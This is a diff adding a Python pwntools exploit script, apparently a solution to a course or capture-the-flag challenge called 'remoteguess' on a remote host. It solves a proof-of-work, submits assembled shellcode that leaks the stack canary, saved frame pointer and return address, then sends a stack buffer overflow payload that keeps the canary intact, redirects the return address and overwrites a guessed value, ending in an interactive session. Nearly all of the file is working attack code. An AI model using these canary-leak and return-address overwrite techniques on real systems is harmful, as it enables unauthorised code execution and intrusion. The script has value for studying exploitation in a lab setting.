@@ -1,0 +1,65 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import os
+import sys
+import pow as pw
+from pwn import *
+
+context.arch = 'amd64'
+context.os = 'linux'
+
+exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];
+
+payload = None
+if os.path.exists(exe):
+    with open(exe, 'rb') as f:
+        payload = f.read()
+# r = process("./remoteguess", shell=True)
+#r = remote("localhost", 10816)
+r = remote("up23.zoolab.org", 10816)
+
+if type(r) != pwnlib.tubes.process.process:
+    pw.solve_pow(r)
+payload = asm('''
+    enter 0x30, 0
+    mov QWORD PTR [rbp-0x28], rdi
+
+    mov rdx, QWORD PTR [rbp-0x28]
+    mov rsi, QWORD PTR fs:0x28
+    lea rdi, [rip+str]
+    call rdx
+
+    mov rdx, QWORD PTR [rbp-0x28]
+    mov rsi, QWORD PTR [rbp]
+    lea rdi, [rip+str]
+    call rdx
+
+    mov rdx, QWORD PTR [rbp-0x28]
+    mov rsi, QWORD PTR [rbp+0x8]
+    lea rdi, [rip+str]
+    call rdx
+    leave
+    ret
+str: .String "%lu\\n"
+''')
+
+if payload != None:
+    print("** {} bytes to submit".format(len(payload)))
+    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
+    r.sendlineafter(b'to call? ', str(0).encode())
+    r.sendafter(b'bytes): ', payload)
+    guess=1234
+    r.recvline()
+    canary=int(r.recvline())
+    rbp=int(r.recvline())
+    address=int(r.recvline())+0XAB
+    input=str(guess).encode('ascii').ljust(0x18, b'\0')+p64(canary)+p64(rbp)+p64(address).ljust(0x14, b'\0')+p32(guess)
+    r.send(input)
+
+else:
+    r.sendlineafter(b'send to me? ', b'0')
+
+r.interactive()
+
+# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
